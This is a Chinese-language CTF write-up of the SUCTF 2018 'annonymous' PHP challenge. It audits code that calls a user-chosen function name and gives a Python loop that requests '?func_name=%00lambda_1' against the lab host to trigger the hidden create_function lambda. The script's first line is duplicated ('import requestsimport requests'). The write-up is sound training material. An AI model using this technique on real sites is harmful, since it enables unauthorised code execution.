---
title: '[SUCTF 2018]annonymous'
date: 2024-08-25 20:33:59
tags: 题解
categories: 刷题笔记
---

## [SUCTF 2018]annonymous

我们进行代码审计

```
<?php

$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__);
```

首先创建了一个匿名函数，会输出flag

接着openssl_random_pseudo_bytes(32)生成一个随机数，然后将其转成了十六进制，将其赋值给$hash

<!--more-->

接着SUCTF\_和hash拼接成一个新的函数名，函数会执行上面构造的匿名函数
所以，要想获得flag就只有两种办法，直接执行匿名函数，或者执行SUCTF_和hash拼接成的新函数



`create_function()函数在创建之后会生成一个函数名为：%00lambda_%d`
`%d`是持续递增的，这里的`%d`会一直递增到最大长度直到结束



**方法一**

Apache启动新的线程，这样这里的`%d`会刷新为1，就可以预测了
写个脚本一直去刷新访问即可：

```python
import requestsimport requests
while True:
    r=requests.get('http://3352ebc5-790b-4aee-8996-9fd93ed8f887.node5.buuoj.cn:81/?func_name=%00lambda_1')
    if 'flag' in r.text:
        print(r.text)
        break
    print('Testing.......')

```

得到flag

![image-20240825204716323](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252047407.png)



**方法二**

我们还可以对%00lambda_%d的%d进行爆破，从而执行该函数

![image-20240825205301498](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252053578.png)
